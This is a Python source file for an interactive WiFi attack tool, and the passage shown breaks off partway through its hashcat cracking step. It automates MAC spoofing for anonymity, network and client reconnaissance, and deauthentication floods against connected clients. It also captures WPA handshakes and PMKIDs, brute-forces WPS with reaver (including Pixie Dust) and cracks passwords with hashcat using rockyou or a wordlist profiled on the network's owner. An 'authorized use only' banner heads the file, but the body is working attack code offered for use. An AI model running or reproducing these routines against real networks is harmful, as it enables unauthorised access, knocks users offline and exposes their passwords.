#!/usr/bin/env python3
"""
WiFi Attack Automation Suite - Complete Edition
================================================
AUTHORIZED USE ONLY - For penetration testing, security research, and educational purposes.
Only use on networks you own or have explicit written permission to test.

Features:
- Automated WiFi scanning with detailed AP and client info
- Multiple attack vectors: WPA Handshake, PMKID, WPS (Pixie Dust, PIN)
- Comprehensive vulnerability assessment
- Client tracking and targeted deauth
- Automatic hashcat integration
- Network connection after successful crack
- Interactive menu system with verbose output
"""

import os
import sys
import time
import subprocess
import re
import signal
import argparse
import json
from datetime import datetime
from pathlib import Path
from collections import defaultdict

# Try to import wordlist generator
try:
    from wordlist_generator import WordlistGenerator
    WORDLIST_GEN_AVAILABLE = True
except ImportError:
    WORDLIST_GEN_AVAILABLE = False


class Colors:
    """ANSI color codes for terminal output"""
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


class WiFiAttackSuite:
    def __init__(self, verbose=False):
        self.verbose = verbose
        self.interface = None
        self.monitor_interface = None
        self.networks = []
        self.clients = defaultdict(list)
        self.capture_dir = Path.home() / "wifi_captures"
        self.capture_dir.mkdir(exist_ok=True)
        self.current_process = None
        self.original_interface = None
        self.oui_database = {}

        # Register signal handler for cleanup
        signal.signal(signal.SIGINT, self.signal_handler)

    def signal_handler(self, sig, frame):
        """Handle Ctrl+C gracefully"""
        print(f"\n{Colors.WARNING}[!] Interrupt received, cleaning up...{Colors.ENDC}")
        self.cleanup()
        sys.exit(0)

    def log(self, message, level="INFO"):
        """Print formatted log messages"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        colors = {
            "INFO": Colors.OKBLUE,
            "SUCCESS": Colors.OKGREEN,
            "WARNING": Colors.WARNING,
            "ERROR": Colors.FAIL,
            "HEADER": Colors.HEADER,
            "VULN": Colors.FAIL + Colors.BOLD
        }
        color = colors.get(level, Colors.ENDC)
        print(f"{color}[{timestamp}] [{level}] {message}{Colors.ENDC}")

    def verbose_log(self, message):
        """Print verbose output"""
        if self.verbose:
            print(f"{Colors.OKCYAN}[VERBOSE] {message}{Colors.ENDC}")

    def run_command(self, cmd, shell=False, capture_output=False, show_output=True):
        """Execute system command with optional output capture"""
        self.verbose_log(f"Executing: {cmd if isinstance(cmd, str) else ' '.join(cmd)}")

        try:
            if capture_output:
                result = subprocess.run(cmd, shell=shell, capture_output=True, text=True, timeout=300)
                if show_output and self.verbose and result.stdout:
                    print(result.stdout)
                if result.stderr and self.verbose:
                    print(f"{Colors.WARNING}{result.stderr}{Colors.ENDC}")
                return result
            else:
                if show_output:
                    subprocess.run(cmd, shell=shell, timeout=300)
                else:
                    subprocess.run(cmd, shell=shell, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=300)
                return None
        except subprocess.TimeoutExpired:
            self.log("Command timeout", "WARNING")
            return None
        except Exception as e:
            self.log(f"Command failed: {e}", "ERROR")
            return None

    def check_dependencies(self):
        """Check if required tools are installed"""
        self.log("Checking dependencies...", "INFO")
        dependencies = {
            'airmon-ng': 'aircrack-ng',
            'airodump-ng': 'aircrack-ng',
            'aireplay-ng': 'aircrack-ng',
            'hashcat': 'hashcat',
            'iwconfig': 'wireless-tools',
            'reaver': 'reaver',
            'wash': 'reaver',
            'hcxdumptool': 'hcxtools',
            'hcxpcapngtool': 'hcxtools',
            'nmcli': 'network-manager'
        }

        missing = []
        available = []
        for cmd, package in dependencies.items():
            result = subprocess.run(['which', cmd], capture_output=True)
            if result.returncode != 0:
                missing.append(f"{cmd} ({package})")
            else:
                available.append(cmd)

        if available:
            self.log(f"Found {len(available)} tools", "SUCCESS")
            if self.verbose:
                for tool in available:
                    print(f"  ✓ {tool}")

        if missing:
            self.log(f"Missing {len(missing)} optional tools (some features unavailable):", "WARNING")
            for dep in missing:
                print(f"  - {dep}")
            print("\nInstall with:")
            print("  sudo apt update")
            print("  sudo apt install aircrack-ng hashcat wireless-tools reaver hcxtools network-manager")
            print()

        # Check for critical tools
        critical = ['airmon-ng', 'airodump-ng', 'aireplay-ng']
        if any(tool not in available for tool in critical):
            self.log("Critical tools missing! Install aircrack-ng suite.", "ERROR")
            return False

        return True

    def check_root(self):
        """Check if running as root"""
        if os.geteuid() != 0:
            self.log("This tool requires root privileges. Run with sudo.", "ERROR")
            return False
        return True

    def get_interfaces(self):
        """Get available wireless interfaces"""
        self.verbose_log("Scanning for wireless interfaces...")
        result = self.run_command(['iwconfig'], capture_output=True, show_output=False)

        if not result:
            return []

        interfaces = []
        current_iface = None

        for line in result.stdout.split('\n'):
            # New interface starts at beginning of line
            if line and not line[0].isspace():
                parts = line.split()
                if parts:
                    current_iface = parts[0]
                    # Check if it's a wireless interface
                    if 'IEEE 802.11' in line or 'ESSID' in line or 'Mode:' in line:
                        if current_iface not in interfaces:
                            interfaces.append(current_iface)

        # Also check with ip link for additional interfaces
        result = self.run_command(['ip', 'link', 'show'], capture_output=True, show_output=False)
        if result:
            for line in result.stdout.split('\n'):
                if 'wlan' in line.lower() or 'wlp' in line.lower():
                    match = re.search(r'^\d+:\s+(\S+):', line)
                    if match:
                        iface = match.group(1)
                        if iface not in interfaces:
                            interfaces.append(iface)

        return interfaces

    def select_interface(self):
        """Interactive interface selection"""
        interfaces = self.get_interfaces()

        if not interfaces:
            self.log("No wireless interfaces found!", "ERROR")
            self.log("Make sure your wireless adapter is connected", "INFO")
            return False

        print(f"\n{Colors.HEADER}{'='*60}")
        print("Available Wireless Interfaces")
        print(f"{'='*60}{Colors.ENDC}\n")

        # Get detailed info for each interface
        for i, iface in enumerate(interfaces, 1):
            result = self.run_command(['iwconfig', iface], capture_output=True, show_output=False)
            mode = "Unknown"
            if result and result.stdout:
                if 'Mode:Monitor' in result.stdout:
                    mode = "Monitor"
                elif 'Mode:Managed' in result.stdout:
                    mode = "Managed"

            print(f"  [{i}] {iface:<15} (Mode: {mode})")

        while True:
            try:
                choice = input(f"\n{Colors.OKBLUE}Select interface [1-{len(interfaces)}]: {Colors.ENDC}")
                idx = int(choice) - 1
                if 0 <= idx < len(interfaces):
                    self.interface = interfaces[idx]
                    self.original_interface = self.interface
                    self.log(f"Selected interface: {self.interface}", "SUCCESS")
                    return True
                else:
                    print(f"{Colors.FAIL}Invalid selection{Colors.ENDC}")
            except (ValueError, KeyboardInterrupt):
                print()
                return False

    def change_mac_address(self):
        """Change MAC address for anonymity"""
        print(f"\n{Colors.HEADER}{'='*60}")
        print("MAC Address Configuration")
        print(f"{'='*60}{Colors.ENDC}\n")

        # Get current MAC
        result = self.run_command(['ip', 'link', 'show', self.interface], capture_output=True, show_output=False)
        current_mac = "Unknown"

        if result and result.stdout:
            mac_match = re.search(r'link/ether ([0-9a-f:]{17})', result.stdout.lower())
            if mac_match:
                current_mac = mac_match.group(1)

        print(f"Current MAC: {current_mac}")
        print("\nOptions:")
        print("  [1] Keep current MAC")
        print("  [2] Generate random MAC")
        print("  [3] Enter custom MAC")
        print()

        choice = input(f"{Colors.OKBLUE}Select option [1-3]: {Colors.ENDC}").strip()

        if choice == '1':
            self.log("Keeping current MAC address", "INFO")
            return True

        # Check if macchanger is available
        has_macchanger = subprocess.run(['which', 'macchanger'], capture_output=True).returncode == 0

        new_mac = None

        if choice == '2':
            if has_macchanger:
                self.log("Generating random MAC address...", "INFO")
                # Bring interface down
                self.run_command(['ip', 'link', 'set', self.interface, 'down'], show_output=False)
                # Change MAC with macchanger
                result = self.run_command(['macchanger', '-r', self.interface], capture_output=True)
                # Bring interface up
                self.run_command(['ip', 'link', 'set', self.interface, 'up'], show_output=False)

                if result and 'new mac' in result.stdout.lower():
                    self.log("MAC address randomized successfully", "SUCCESS")
                    return True
            else:
                # Generate random MAC manually
                import random
                new_mac = "02:%02x:%02x:%02x:%02x:%02x" % (
                    random.randint(0, 255),
                    random.randint(0, 255),
                    random.randint(0, 255),
                    random.randint(0, 255),
                    random.randint(0, 255)
                )

        elif choice == '3':
            new_mac = input(f"{Colors.OKBLUE}Enter MAC address (e.g., 00:11:22:33:44:55): {Colors.ENDC}").strip()

            # Validate MAC format
            if not re.match(r'^([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}$', new_mac):
                self.log("Invalid MAC address format", "ERROR")
                return False

        # Set MAC manually if not using macchanger
        if new_mac:
            self.log(f"Setting MAC to {new_mac}...", "INFO")

            # Bring interface down
            self.run_command(['ip', 'link', 'set', self.interface, 'down'], show_output=False)

            # Change MAC
            result = self.run_command(['ip', 'link', 'set', 'dev', self.interface, 'address', new_mac],
                                     capture_output=True, show_output=False)

            # Bring interface up
            self.run_command(['ip', 'link', 'set', self.interface, 'up'], show_output=False)

            if result and result.returncode == 0:
                self.log("MAC address changed successfully", "SUCCESS")
                return True
            else:
                self.log("Failed to change MAC address", "ERROR")
                return False

        return True

    def enable_monitor_mode(self):
        """Enable monitor mode on selected interface"""
        self.log(f"Enabling monitor mode on {self.interface}...", "INFO")

        # Check if already in monitor mode
        result = self.run_command(['iwconfig', self.interface], capture_output=True, show_output=False)
        if result and 'Mode:Monitor' in result.stdout:
            self.log("Interface already in monitor mode", "SUCCESS")
            self.monitor_interface = self.interface
            return True

        # Kill interfering processes
        self.verbose_log("Killing interfering processes...")
        self.run_command(['airmon-ng', 'check', 'kill'], show_output=self.verbose)

        # Enable monitor mode
        result = self.run_command(['airmon-ng', 'start', self.interface], capture_output=True)

        if result and result.returncode == 0:
            # Monitor interface might be interface name + 'mon'
            possible_names = [
                self.interface + 'mon',
                self.interface,
                'wlan0mon',
                'wlan1mon'
            ]

            # Verify monitor mode is enabled
            time.sleep(2)

            for name in possible_names:
                check = self.run_command(['iwconfig', name], capture_output=True, show_output=False)
                if check and 'Mode:Monitor' in check.stdout:
                    self.monitor_interface = name
                    self.log(f"Monitor mode enabled: {self.monitor_interface}", "SUCCESS")
                    return True

        self.log("Failed to enable monitor mode", "ERROR")
        self.log("Try manually: sudo airmon-ng start " + self.interface, "INFO")
        return False

    def disable_monitor_mode(self):
        """Disable monitor mode and restore interface"""
        if self.monitor_interface:
            self.log(f"Disabling monitor mode on {self.monitor_interface}...", "INFO")
            self.run_command(['airmon-ng', 'stop', self.monitor_interface], show_output=self.verbose)
            self.monitor_interface = None

            # Restart NetworkManager if it was killed
            self.verbose_log("Restarting NetworkManager...")
            self.run_command(['systemctl', 'start', 'NetworkManager'], show_output=False)
            time.sleep(2)

    def scan_networks(self, duration=30):
        """Scan for nearby WiFi networks with detailed info"""
        if not self.monitor_interface:
            self.log("Monitor mode not enabled!", "ERROR")
            return False

        self.log(f"Scanning for networks (duration: {duration}s)...", "INFO")
        print(f"{Colors.WARNING}Gathering comprehensive AP and client information...{Colors.ENDC}")
        print(f"{Colors.WARNING}Press Ctrl+C when you see your target network{Colors.ENDC}\n")

        # Create temporary capture file
        scan_file = self.capture_dir / f"scan_{int(time.time())}"

        try:
            # Start airodump-ng with full output
            cmd = [
                'airodump-ng',
                '--write', str(scan_file),
                '--output-format', 'csv',
                '--manufacturer',  # Include manufacturer info
                self.monitor_interface
            ]

            if self.verbose:
                self.current_process = subprocess.Popen(cmd)
            else:
                self.current_process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

            # Let it run for specified duration
            time.sleep(duration)

            # Stop the process
            self.current_process.terminate()
            self.current_process.wait()
            self.current_process = None

        except KeyboardInterrupt:
            if self.current_process:
                self.current_process.terminate()
                self.current_process.wait()
                self.current_process = None
            print()

        # Parse the CSV file
        csv_file = f"{scan_file}-01.csv"
        if os.path.exists(csv_file):
            self.parse_scan_results(csv_file)

            # Also scan for WPS
            self.scan_wps()

            # Cleanup scan files
            for f in Path(self.capture_dir).glob(f"{scan_file.name}*"):
                f.unlink()
            return True
        else:
            self.log("No scan results found", "ERROR")
            return False

    def parse_scan_results(self, csv_file):
        """Parse airodump-ng CSV output for APs and clients"""
        self.networks = []
        self.clients = defaultdict(list)

        try:
            with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()

            # Split into networks and clients sections
            sections = content.split('\r\n\r\n')
            if len(sections) < 2:
                sections = content.split('\n\n')

            # Parse Access Points
            if sections:
                network_lines = sections[0].split('\n')
                data_started = False

                for line in network_lines:
                    if data_started and line.strip():
                        parts = [p.strip() for p in line.split(',')]
                        if len(parts) >= 14:
                            bssid = parts[0]
                            first_seen = parts[1]
                            last_seen = parts[2]
                            channel = parts[3]
                            speed = parts[4]
                            encryption = parts[5]
                            cipher = parts[6]
                            auth = parts[7]
                            power = parts[8]
                            beacons = parts[9]
                            ivs = parts[10]
                            lan_ip = parts[11]
                            id_length = parts[12]
                            essid = parts[13] if len(parts) > 13 else ''

                            # Get manufacturer if available
                            manufacturer = parts[14] if len(parts) > 14 else ''

                            if essid and bssid != 'BSSID':  # Skip header
                                self.networks.append({
                                    'bssid': bssid,
                                    'essid': essid,
                                    'channel': channel,
                                    'encryption': encryption,
                                    'cipher': cipher,
                                    'auth': auth,
                                    'power': power,
                                    'beacons': beacons,
                                    'speed': speed,
                                    'manufacturer': manufacturer,
                                    'wps': False,
                                    'wps_locked': False,
                                    'wps_version': ''
                                })

                    if 'BSSID' in line and 'First time seen' in line:
                        data_started = True

            # Parse Clients
            if len(sections) > 1:
                client_lines = sections[1].split('\n')
                data_started = False

                for line in client_lines:
                    if data_started and line.strip():
                        parts = [p.strip() for p in line.split(',')]
                        if len(parts) >= 6:
                            client_mac = parts[0]
                            first_seen = parts[1]
                            last_seen = parts[2]
                            power = parts[3]
                            packets = parts[4]
                            bssid = parts[5]
                            probed_essids = parts[6] if len(parts) > 6 else ''

                            if client_mac and client_mac != 'Station MAC':
                                client_info = {
                                    'mac': client_mac,
                                    'power': power,
                                    'packets': packets,
                                    'probed': probed_essids
                                }

                                if bssid and bssid != '(not associated)':
                                    self.clients[bssid].append(client_info)

                    if 'Station MAC' in line:
                        data_started = True

        except Exception as e:
            self.log(f"Error parsing scan results: {e}", "ERROR")
            if self.verbose:
                import traceback
                traceback.print_exc()

    def scan_wps(self):
        """Scan for WPS-enabled networks"""
        # Check if wash is available
        result = subprocess.run(['which', 'wash'], capture_output=True)
        if result.returncode != 0:
            self.verbose_log("wash not found, skipping WPS scan")
            return

        self.verbose_log("Scanning for WPS-enabled networks...")

        try:
            # Run wash for 10 seconds
            cmd = ['wash', '-i', self.monitor_interface, '-C']
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)

            time.sleep(10)
            process.terminate()
            output, _ = process.communicate()

            # Parse wash output
            for line in output.split('\n'):
                # Example: 00:11:22:33:44:55  -45  5  Yes  1.0  WPS_Network
                if re.match(r'^[0-9A-Fa-f:]{17}', line):
                    parts = line.split()
                    if len(parts) >= 5:
                        bssid = parts[0]
                        wps_locked = 'Yes' in parts[3] or 'Yes' in parts
                        wps_version = parts[4] if len(parts) > 4 else '1.0'

                        # Update network info
                        for net in self.networks:
                            if net['bssid'].upper() == bssid.upper():
                                net['wps'] = True
                                net['wps_locked'] = wps_locked
                                net['wps_version'] = wps_version
                                break

        except Exception as e:
            self.verbose_log(f"WPS scan error: {e}")

    def display_networks(self):
        """Display discovered networks with comprehensive info"""
        if not self.networks:
            self.log("No networks found", "WARNING")
            return False

        print(f"\n{Colors.HEADER}{'='*140}")
        print(f"{'Discovered Networks with Attack Vectors':^140}")
        print(f"{'='*140}{Colors.ENDC}\n")

        # Header
        print(f"{'#':<4} {'ESSID':<25} {'BSSID':<19} {'CH':<4} {'PWR':<5} {'ENC':<15} {'WPS':<8} {'Clients':<8} {'Attack Vectors':<30}")
        print("-" * 140)

        for i, net in enumerate(self.networks, 1):
            # Determine attack vectors
            vectors = []
            if net['wps'] and not net['wps_locked']:
                vectors.append(f"{Colors.FAIL}WPS{Colors.ENDC}")
            if 'WPA' in net['encryption']:
                vectors.append("Handshake")
                vectors.append("PMKID")
            if 'WEP' in net['encryption']:
                vectors.append(f"{Colors.FAIL}WEP{Colors.ENDC}")

            wps_status = f"{Colors.OKGREEN}Yes{Colors.ENDC}" if net['wps'] else "No"
            if net['wps'] and net['wps_locked']:
                wps_status = f"{Colors.WARNING}Locked{Colors.ENDC}"

            client_count = len(self.clients.get(net['bssid'], []))

            print(f"{i:<4} {net['essid']:<25} {net['bssid']:<19} {net['channel']:<4} "
                  f"{net['power']:<5} {net['encryption']:<15} {wps_status:<15} "
                  f"{client_count:<8} {', '.join(vectors):<30}")

        print()
        return True

    def display_target_details(self, target):
        """Display detailed information about target network"""
        print(f"\n{Colors.HEADER}{'='*80}")
        print(f"Target Network Details")
        print(f"{'='*80}{Colors.ENDC}\n")

        details = [
            ("ESSID", target['essid']),
            ("BSSID", target['bssid']),
            ("Channel", target['channel']),
            ("Encryption", target['encryption']),
            ("Cipher", target['cipher']),
            ("Authentication", target['auth']),
            ("Power", target['power'] + " dBm"),
            ("Speed", target['speed'] + " Mbps"),
            ("Manufacturer", target.get('manufacturer', 'Unknown')),
            ("WPS Enabled", "Yes" if target.get('wps') else "No"),
            ("WPS Locked", "Yes" if target.get('wps_locked') else "No"),
        ]

        for key, value in details:
            print(f"  {key:<20}: {value}")

        # Display clients
        clients = self.clients.get(target['bssid'], [])
        print(f"\n  Connected Clients: {len(clients)}")

        if clients:
            print("\n  Client Details:")
            print(f"  {'#':<4} {'MAC Address':<20} {'Power':<10} {'Packets':<10}")
            print("  " + "-" * 50)
            for i, client in enumerate(clients, 1):
                print(f"  {i:<4} {client['mac']:<20} {client['power']:<10} {client['packets']:<10}")

        print()

    def select_target(self):
        """Select target network"""
        if not self.display_networks():
            return None

        while True:
            try:
                choice = input(f"{Colors.OKBLUE}Select target network [1-{len(self.networks)}], 'r' to rescan, or 'q' to quit: {Colors.ENDC}")

                if choice.lower() == 'r':
                    return 'rescan'
                elif choice.lower() == 'q':
                    return None

                idx = int(choice) - 1
                if 0 <= idx < len(self.networks):
                    target = self.networks[idx]
                    self.display_target_details(target)
                    self.log(f"Selected target: {target['essid']} ({target['bssid']})", "SUCCESS")
                    return target
                else:
                    print(f"{Colors.FAIL}Invalid selection{Colors.ENDC}")
            except (ValueError, KeyboardInterrupt):
                print()
                return None

    def select_attack_vector(self, target):
        """Select attack method based on target capabilities"""
        print(f"\n{Colors.HEADER}{'='*60}")
        print("Available Attack Vectors")
        print(f"{'='*60}{Colors.ENDC}\n")

        vectors = []

        # WPS attacks
        if target.get('wps'):
            if not target.get('wps_locked'):
                vectors.append(('WPS Pixie Dust Attack', 'pixie'))
                vectors.append(('WPS PIN Bruteforce', 'wps_pin'))
            else:
                print(f"{Colors.WARNING}WPS is locked (rate limited){Colors.ENDC}")

        # WPA attacks
        if 'WPA' in target['encryption']:
            vectors.append(('PMKID Attack (no clients needed)', 'pmkid'))
            vectors.append(('WPA Handshake Capture', 'handshake'))

        # WEP attacks
        if 'WEP' in target['encryption']:
            vectors.append(('WEP Attack (Legacy)', 'wep'))

        # Automated
        vectors.append(('Automated (try all methods)', 'auto'))

        if not vectors:
            self.log("No attack vectors available for this target", "ERROR")
            return None

        for i, (name, _) in enumerate(vectors, 1):
            print(f"  [{i}] {name}")

        while True:
            try:
                choice = input(f"\n{Colors.OKBLUE}Select attack vector [1-{len(vectors)}]: {Colors.ENDC}")
                idx = int(choice) - 1
                if 0 <= idx < len(vectors):
                    selected = vectors[idx]
                    self.log(f"Selected: {selected[0]}", "SUCCESS")
                    return selected[1]
                else:
                    print(f"{Colors.FAIL}Invalid selection{Colors.ENDC}")
            except (ValueError, KeyboardInterrupt):
                print()
                return None

    def attack_pmkid(self, target):
        """PMKID attack - faster than handshake, no clients needed"""
        self.log("Starting PMKID attack...", "INFO")

        # Check if hcxdumptool is available
        result = subprocess.run(['which', 'hcxdumptool'], capture_output=True)
        if result.returncode != 0:
            self.log("hcxdumptool not found. Install: sudo apt install hcxtools", "ERROR")
            return None

        bssid = target['bssid']
        channel = target['channel']
        essid = target['essid']

        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        capture_file = self.capture_dir / f"{essid}_pmkid_{timestamp}.pcapng"

        # Set channel
        self.run_command(['iwconfig', self.monitor_interface, 'channel', channel], show_output=False)

        self.log("Attempting to capture PMKID...", "INFO")
        print(f"  Target: {essid} ({bssid})")
        print(f"  Duration: 60 seconds\n")

        # Run hcxdumptool
        cmd = [
            'hcxdumptool',
            '-i', self.monitor_interface,
            '-o', str(capture_file),
            '--enable_status=1',
            '--filterlist_ap=' + bssid,
            '--filtermode=2'
        ]

        try:
            if self.verbose:
                process = subprocess.Popen(cmd)
            else:
                process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

            time.sleep(60)
            process.terminate()
            process.wait()

        except KeyboardInterrupt:
            process.terminate()
            process.wait()
            print()

        # Check if PMKID was captured
        if os.path.exists(capture_file):
            # Convert to hashcat format
            hash_file = str(capture_file).replace('.pcapng', '.hash')

            result = self.run_command(['hcxpcapngtool', '-o', hash_file, str(capture_file)],
                                     capture_output=True)

            if os.path.exists(hash_file) and os.path.getsize(hash_file) > 0:
                self.log("PMKID captured successfully!", "SUCCESS")
                return hash_file
            else:
                self.log("No PMKID found in capture", "WARNING")
        else:
            self.log("Capture file not created", "ERROR")

        return None

    def attack_handshake(self, target, timeout=120):
        """WPA handshake capture with targeted deauth"""
        essid = target['essid']
        bssid = target['bssid']
        channel = target['channel']
        clients = self.clients.get(bssid, [])

        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        capture_file = self.capture_dir / f"{essid}_handshake_{timestamp}"

        self.log(f"Starting handshake capture for {essid}...", "INFO")
        print(f"  BSSID: {bssid}")
        print(f"  Channel: {channel}")
        print(f"  Clients: {len(clients)}")
        print(f"  Capture file: {capture_file}")
        print(f"  Timeout: {timeout}s\n")

        if not clients:
            self.log("No clients detected. Waiting for connections...", "WARNING")

        # Start airodump-ng on specific channel
        airodump_cmd = [
            'airodump-ng',
            '--bssid', bssid,
            '--channel', channel,
            '--write', str(capture_file),
            '--output-format', 'pcap',
            self.monitor_interface
        ]

        self.verbose_log(f"Starting airodump-ng: {' '.join(airodump_cmd)}")

        if self.verbose:
            airodump_process = subprocess.Popen(airodump_cmd)
        else:
            airodump_process = subprocess.Popen(airodump_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        time.sleep(3)

        # Send targeted deauth packets
        if clients:
            self.log(f"Sending targeted deauth to {len(clients)} clients...", "INFO")

            for client in clients:
                client_mac = client['mac']
                self.verbose_log(f"Deauthing client: {client_mac}")

                deauth_cmd = [
                    'aireplay-ng',
                    '--deauth', '5',
                    '-a', bssid,
                    '-c', client_mac,
                    self.monitor_interface
                ]

                if self.verbose:
                    subprocess.run(deauth_cmd)
                else:
                    subprocess.run(deauth_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

                time.sleep(2)
        else:
            # Broadcast deauth
            self.log("Sending broadcast deauth packets...", "INFO")

            for i in range(3):
                deauth_cmd = [
                    'aireplay-ng',
                    '--deauth', '10',
                    '-a', bssid,
                    self.monitor_interface
                ]

                if self.verbose:
                    subprocess.run(deauth_cmd)
                else:
                    subprocess.run(deauth_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

                time.sleep(10)

        # Wait for handshake
        self.log(f"Waiting for handshake (max {timeout}s)...", "INFO")
        print(f"{Colors.WARNING}Waiting for client reconnection...{Colors.ENDC}\n")

        start_time = time.time()
        handshake_captured = False

        try:
            while time.time() - start_time < timeout:
                # Check if handshake was captured
                cap_file = f"{capture_file}-01.cap"
                if os.path.exists(cap_file):
                    # Verify handshake with aircrack-ng
                    check_cmd = ['aircrack-ng', cap_file]
                    result = subprocess.run(check_cmd, capture_output=True, text=True)

                    if 'handshake' in result.stdout.lower() or '1 handshake' in result.stdout.lower():
                        handshake_captured = True
                        break

                time.sleep(5)
                remaining = int(timeout - (time.time() - start_time))
                if remaining % 15 == 0 and remaining > 0:
                    print(f"  {remaining}s remaining...")

        except KeyboardInterrupt:
            print()

        # Stop airodump-ng
        airodump_process.terminate()
        airodump_process.wait()

        if handshake_captured:
            self.log("Handshake captured successfully!", "SUCCESS")
            return f"{capture_file}-01.cap"
        else:
            self.log("Failed to capture handshake", "ERROR")
            # Cleanup failed capture files
            for f in Path(self.capture_dir).glob(f"{capture_file.name}*"):
                f.unlink()
            return None

    def attack_wps_pixie(self, target, timeout=300):
        """WPS Pixie Dust attack"""
        self.log("Starting WPS Pixie Dust attack...", "INFO")

        # Check if reaver is available
        result = subprocess.run(['which', 'reaver'], capture_output=True)
        if result.returncode != 0:
            self.log("reaver not found. Install: sudo apt install reaver", "ERROR")
            return None

        bssid = target['bssid']
        channel = target['channel']
        essid = target['essid']

        self.log(f"Target: {essid} ({bssid})", "INFO")
        self.log("This may take a few minutes...", "INFO")

        # Reaver with Pixie Dust
        cmd = [
            'reaver',
            '-i', self.monitor_interface,
            '-b', bssid,
            '-c', channel,
            '-K', '1',  # Pixie Dust attack
            '-vv'
        ]

        self.verbose_log(f"Running: {' '.join(cmd)}")

        try:
            result = self.run_command(cmd, capture_output=True, show_output=True)

            if result and result.stdout:
                # Check for PIN
                pin_match = re.search(r'WPS PIN: [\'"]?(\d{8})[\'"]?', result.stdout)
                psk_match = re.search(r'WPA PSK: [\'"]?(.+?)[\'"]?$', result.stdout, re.MULTILINE)

                if pin_match:
                    pin = pin_match.group(1)
                    self.log(f"WPS PIN Found: {pin}", "SUCCESS")

                    if psk_match:
                        psk = psk_match.group(1).strip()
                        self.log(f"WPA Password: {psk}", "SUCCESS")
                        return {'type': 'password', 'password': psk, 'pin': pin}

                    return {'type': 'pin', 'pin': pin}

        except Exception as e:
            self.log(f"Pixie Dust attack failed: {e}", "ERROR")

        return None

    def attack_wps_pin(self, target):
        """WPS PIN bruteforce"""
        self.log("WPS PIN bruteforce attack...", "WARNING")
        self.log("This can take many hours and may not succeed if WPS is rate-limited", "WARNING")

        proceed = input(f"\n{Colors.OKBLUE}Continue? (y/n): {Colors.ENDC}")
        if proceed.lower() != 'y':
            return None

        # Similar to pixie but without -K flag
        bssid = target['bssid']
        channel = target['channel']

        cmd = [
            'reaver',
            '-i', self.monitor_interface,
            '-b', bssid,
            '-c', channel,
            '-vv'
        ]

        self.log("Starting WPS PIN bruteforce (this will take a long time)...", "INFO")
        self.log("Press Ctrl+C to stop", "INFO")

        try:
            result = self.run_command(cmd, capture_output=True, show_output=True)

            if result and result.stdout:
                pin_match = re.search(r'WPS PIN: [\'"]?(\d{8})[\'"]?', result.stdout)
                psk_match = re.search(r'WPA PSK: [\'"]?(.+?)[\'"]?$', result.stdout, re.MULTILINE)

                if pin_match and psk_match:
                    return {'type': 'password', 'password': psk_match.group(1).strip(), 'pin': pin_match.group(1)}

        except Exception as e:
            self.log(f"WPS bruteforce failed: {e}", "ERROR")

        return None

    def convert_to_hashcat(self, cap_file):
        """Convert capture file to hashcat format"""
        self.log("Converting capture to hashcat format...", "INFO")

        hash_file = cap_file.replace('.cap', '.hash')

        # Try using hcxpcapngtool (newer method for .cap files too)
        result = subprocess.run(['which', 'hcxpcapngtool'], capture_output=True)

        if result.returncode == 0:
            self.verbose_log("Using hcxpcapngtool for conversion")
            cmd = ['hcxpcapngtool', '-o', hash_file, cap_file]
            result = self.run_command(cmd, capture_output=True)

            if result and result.returncode == 0 and os.path.exists(hash_file) and os.path.getsize(hash_file) > 0:
                self.log(f"Converted to: {hash_file}", "SUCCESS")
                return hash_file

        self.log("Conversion failed. Install hcxtools: sudo apt install hcxtools", "ERROR")
        return None

    def crack_with_hashcat(self, hash_file, target, wordlist=None):
        """Crack password using hashcat"""
        self.log("Starting hashcat password cracking...", "INFO")

        # Ask for wordlist if not provided
        if not wordlist:
            print(f"\n{Colors.HEADER}{'='*60}")
            print("Wordlist Selection")
            print(f"{'='*60}{Colors.ENDC}\n")

            print("Options:")
            print("  [1] Use existing wordlist (e.g., rockyou.txt)")
            if WORDLIST_GEN_AVAILABLE:
                print("  [2] Generate custom wordlist (target-specific)")
                print("  [3] Generate custom wordlist + use rockyou.txt")
            print()

            choice = input(f"{Colors.OKBLUE}Select option [1-3]: {Colors.ENDC}").strip()

            if WORDLIST_GEN_AVAILABLE and choice in ['2', '3']:
                self.log("Launching custom wordlist generator...", "INFO")
                gen = WordlistGenerator(verbose=self.verbose)

                # Profile target
                print(f"\n{Colors.WARNING}Generate passwords based on target network owner info{Colors.ENDC}")
                print(f"{Colors.WARNING}(business name, owner name, address, etc.){Colors.ENDC}\n")

                proceed = input(f"{Colors.OKBLUE}Launch profiler? (y/n): {Colors.ENDC}")

                if proceed.lower() == 'y':
                    custom_wordlist = gen.interactive_menu()
                else:
                    # Quick generation with built-in patterns
                    self.log("Using built-in patterns only...", "INFO")
                    custom_wordlist = gen.quick_generate()

                if custom_wordlist:
                    if choice == '3':
                        # Combine with rockyou
                        self.log("Will try custom wordlist first, then rockyou.txt", "INFO")
                        wordlist = custom_wordlist
                    else:
                        wordlist = custom_wordlist
                else:
                    self.log("Custom wordlist generation failed, using rockyou.txt", "WARNING")
                    wordlist = None
            else:
                print(f"{Colors.OKBLUE}Enter wordlist path (or press Enter for rockyou.txt):{Colors.ENDC}")
                wordlist = input().strip()

        if not wordlist:
            # Try common wordlist locations
            common_wordlists = [
                '/usr/share/wordlists/rockyou.txt',
                '/usr/share/wordlists/rockyou.txt.gz',
                str(Path.home() / 'rockyou.txt'),
                str(Path.home() / 'wordlists' / 'rockyou.txt')
            ]

            for wl in common_wordlists:
                if os.path.exists(wl):
                    wordlist = wl
                    break

            if not wordlist:
